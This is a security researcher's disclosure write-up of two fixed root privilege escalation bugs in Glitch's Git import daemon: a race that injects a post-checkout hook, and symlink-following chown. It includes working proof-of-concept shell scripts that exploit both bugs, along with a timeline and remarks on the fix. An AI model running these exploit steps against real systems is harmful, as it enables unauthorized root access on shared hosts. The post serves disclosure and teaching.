---
date: Sun Oct 10 2021 23:34:42 -0700 (Pacific Daylight Time)
qualitative_time: 
title: The elevated daemon that imported Git projects for you and how it went wrong
previous_teaser: People who like seeing related videos when they pause a video
previous_first: true
---
On Glitch, there's a button for importing a repository from GitHub.
And that's specifically GitHub, not any ol' Git repository.
It works by downloading the repository as a tarball, which is a GitHub-specific feature.

But it seems there used to be a way to import from a general Git repository.
That feature to import from a general Git repository by URL was removed from the UI, but it was still accessible over a project-internal HTTP service.

In May, I discovered two root privilege escalation vulnerabilities that took advantage of this Git import service.
Glitch has now fully removed this service.

# The daemon

The Git service, which offered this import functionality, is not a process of its own, but it's one of the services that ran under Glitch's "watcher" process.
The watcher process runs as root.

The service listens for HTTP requests on a local server and performs various functions, mostly related to Glitch's Rewind feature and GitHub import.
At the time I found these vulnerabilities, it offered an additional piece of functionality to replace the project with a repository from a given Git remote URL.

This function, called `importFromRepo`, worked rougly as follows:

1. Empty out `/app`.
2. Use [simple-git](https://www.npmjs.com/package/simple-git) to clone a specified repository into /app. simple-git runs git as root though, and the contents are checked out as files owned by root.
3. `chown` everything in `/app` back to the `app` user.

Excerpt from `/opt/watcher/build/source/services/git.js` (comments original; again, this is now removed):

```js
    async importFromRepo(context, repoUrl, githubToken, userLogin) {
...
            const baseDir = '/app';
            const currentAppContents = await this.fileService.readdir(baseDir);
            await Promise.all(currentAppContents.map(async (item) => {
                await this.fileService.remove(pathUtil.join(baseDir, item));
            }));
...
            await this.git.clone(cloneUrl, baseDir);
            // I can't see a way to force the simple-git library to run as the app user, so we just modify the file owners here
            // (as otherwise they would be owned by root, not the app users)
            const importedAppContents = await this.fileService.readdir(baseDir);
            await Promise.all(importedAppContents.map(async (item) => {
                await this.fileService.chown(pathUtil.join(baseDir, item), consts_1.APP_USER_ID, consts_1.APP_GROUP_ID);
            }));
```

The simple-git package internally delegates to the `git` executable, which as the code comment notes, would run as root.

# Vulnerability 1: injecting a Git hook

This is the more interesting one, in my opinion.

Git clones by creating the `.git` directory, transferring the refs and objects from the remote, and checking out the default branch.
When it checks out a branch, such as at the end of the clone process, it may execute custom scripts called "hooks" if they've been set up.
Cloning would normally not execute any hooks, because the local repository has just been created, so no hooks would be set up (they're not transferred from the remote).

But because this service clones into a directory `/app` that is owned by the user, we can tamper with the `.git` directory to set up hooks while it's still transferring stuff from the remote.
Then, when it gets to checking out the default branch, it'll execute our hook as root.

Here's a proof of concept script I sent with my report, interspersed with new commentary.

## Sample exploitation

Racing against Git seems like it wouldn't be too hard, because cloning would have Git receive data over the internet.
In this script, we actually clone from another local repository to minimize the external dependencies.
But to give ourselves an advantage, I wrote this special server that intentionally adds huge delays.

```sh
cd /tmp
cat >delay.js <<'EOF'
require('http').createServer((req, res) => {
  console.log(`${req.method} ${req.url}`);
  const path = `.${req.url.split('?')[0]}`;
  // delay hehehe
  setTimeout(() => {
    require('fs').createReadStream(path).pipe(res);
  }, 1000);
}).listen(process.env.PORT, () => {
  console.log('listening');
});
EOF
```

And now we'll create a little repository for us to import.

```sh
mkdir s
cd s
git init
git config user.name w
git config user.email none
echo ok >f
git add f
git commit -m "A"
git show
```

We run the server and give it some time to start up.

```sh
git update-server-info
cd .git
PORT=9988 /opt/nvm/versions/node/v10/bin/node ../../delay.js &
server_pid=$!
sleep 5
```

We ask the service to import our repoistory.

```sh
cd ../..
curl -v -H 'Content-Type: application/json' -d '{"repoUrl": "http://localhost:9988/"}' http://localhost:1083/git/import &
command_pid=$!
```

Setting up the `.git` directory is relatively fast.
Git will then need to transfer at least a ref, a commit, and a file.
So I put in a `sleep` for some time that should put us kind of in the middle of waiting for a request to our intentionally slow server.

```sh
sleep 1.5
```

Now, welcome to the "sneaky area."
Git has created a `.git` directory, and it will later check out a branch.
We can add whatever hooks we want during this time.

We can't do it by adding hook scripts in place, because Git running as root has created the `.git` directory to be owned by root.
But because we own the parent directory, we can replace the `.git` directory with an entirely different one.
We create that new one, based on the real one.

```sh
# vvv sneaky area
cp -r /app/.git new.git
cat >new.git/hooks/post-checkout <<'EOF'
id >/tmp/hi
EOF
chmod +x new.git/hooks/post-checkout
```

![](/assets/2021/glitch-git-import-swap.jpg)

```sh
mv /app/.git /app/old.git
cp -r new.git /app/.git
# ^^^ sneaky area
```

That last `cp -r` there copies instead of using a faster rename because `/tmp/new.git` is on a different filesystem.

Then we let the service finish and clean things up.

```sh
wait "$command_pid"
kill "$server_pid"
wait "$server_pid"
```

# Vulnerability 2: chown dereferences symbolic links

After the service clones the repository as root, the contents are owned by root, so they have to `chown` everything.
It looks like the implementation had other issues, such as not recursively going into subdirectories.

The main thing about it is that it uses [`chown`](https://manpages.ubuntu.com/manpages/xenial/en/man2/chown.2.html), which dereferences symbolic links (`lchown` being the one that changes the ownership of the symbolic link itself).

We could create a repository containing a symbolic link to a system file that root would normally execute.
When we clone the repository, the service will give us ownership of that file, and we could alter it so that we can run something of our choosing when root executes it.

## Sample exploitation

```sh
cd /tmp
mkdir s
cd s
git init
git config user.name w
git config user.email none
ln -s /opt/wetty/wetty-command.sh .
git add wetty-command.sh
git commit -m "A"
git show
git update-server-info
cd ..
curl -v -H 'Content-Type: application/json' -d '{"repoUrl": "file:///tmp/s"}' http://localhost:1083/git/import
```

We'd then edit `/opt/wetty/wetty-command.sh`, which gets executed as root when opening a terminal.

# Timeline

**2021/05/23**
I discover the chown vulnerability.

**2021/05/24**
I discover the hook injection vulnerability.

**2021/05/25**
I write up reports and send them to Glitch.

**2021/05/26**
A support representative confirms that they received the reports.

**2021/10/08**
I notice that the `importFromRepo` function is gone.
I don't know when it was removed.
I ask about the status of these reports, and they say, in agreement with my assessment, that the vulnerabilities are fixed.

# Glitch's fix

They removed this piece of functionality from their Git service.

# Discussion

## Watcher is still run as root

As I noted in [the discussion on another report](/2020/08/10/glitch-privesc-2019.html), the watcher process runs as root, and it's large, making it a place where I would look for vulnerabilities.
Here's a case of something running as root that wasn't careful enough.
We see from the code comment that the developers were aware this would be better run as the user.

## Other ways to fix this

Elsewhere in Glitch's in-container software, there are facilities to run commands as the user.
If they wanted to keep this part of the Git service in place, they probably could have switched to using that, although it would mean losing the thin layer of wrapping provided by the simple-git package.
Alternatively, if they preferred keeping simple-git, they have the code for running a Node.js subprocess with privileges lowered to the user level.
They use this, for example, to run server-side code linters (although this feature is also removed from the UI).

This feature was not in use though, and removing it from the codebase is an obvious way to fix it.

## Git hooks

This is not a vulnerability in Git.

You'd normally only clone into a directory that you own for yourself, so other users on the system wouldn't be able to tamper with it.

Fiddling with a repository located in another user's directory will, naturally, run their hooks.
It's about the same as executing a program that's in another user's directory.
They could change it at any time.

## In-container privilege escalations

They're fixing these vulnerabilities, which is cool.
That's not just for my own satisfaction of feeling like I've made an impact.

At around the same time I found these vulnerabilities, I was working on a proof of concept to show that in-container root privilege escalation could be used to compromise other users' accounts.
I exploited these privilege escalation vulnerabilities to validate that proof of concept, which is part of why it took me an extra day to write up and submit these vulnerabilities.
I hope to be able to publish my findings from this other work after Glitch fixes the related issues.

## Unknown turnaround

I don't know when Glitch applied their fix.
The support representative handling these cases had said they'd let me know when the engineering team gives an update.
But I never heard any update.
